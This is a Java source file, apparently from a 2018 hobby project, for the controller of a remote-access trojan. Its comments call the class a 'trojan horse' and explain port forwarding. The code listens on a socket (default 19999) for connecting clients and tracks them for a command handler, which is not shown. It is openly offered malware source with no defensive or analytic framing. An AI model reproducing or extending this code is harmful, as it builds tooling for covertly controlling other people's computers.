import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

/**
 * Created by pontu on 2018-02-19.
 */

/*
**IMPORTANT**
* because the trojan horse acts as a server it needs the port its accepting communication from
* clients on to be forwarded.
* The port for the trojan horse can be set at start or its 19999

Main trojan horse class
constantly waits for new clients to connect to the trojan horse.
 */
public class TrojanHorse {
    private ServerSocket host;
    private ArrayList<Connection> connections = new ArrayList<>();
    TrojanHorse(String port) {
        try {
            host = new ServerSocket(Integer.parseInt(port));
            CommandHandler ch = new CommandHandler(this);
        }catch(Exception e) {
            e.printStackTrace();
        }
        run();
    }

    /*
    Run method that constantly waits for new clients to connect to the trojan horse controller.
     */
    public void run() {
        while(true) {
            try {
                Socket clientSocket = host.accept();
                Connection con = new Connection(clientSocket, this);
                connections.add(con);
                Thread.sleep(50);
            }catch(Exception e) {
                e.printStackTrace();
            }
        }
    }

    /*
    Method used to kill the thread.
    removes the connection from the connections list.
     */
    public synchronized void killThread(Connection con) {
        connections.remove(con);
    }

    /*
    method used to get connections.
     */
    public ArrayList<Connection> getConnections() {
        return connections;
    }

    public static void main(String[] args) {
        if(args.length > 0) {
            TrojanHorse th = new TrojanHorse(args[0]);
        }else{
            TrojanHorse th = new TrojanHorse("19999");
        }
    }
}
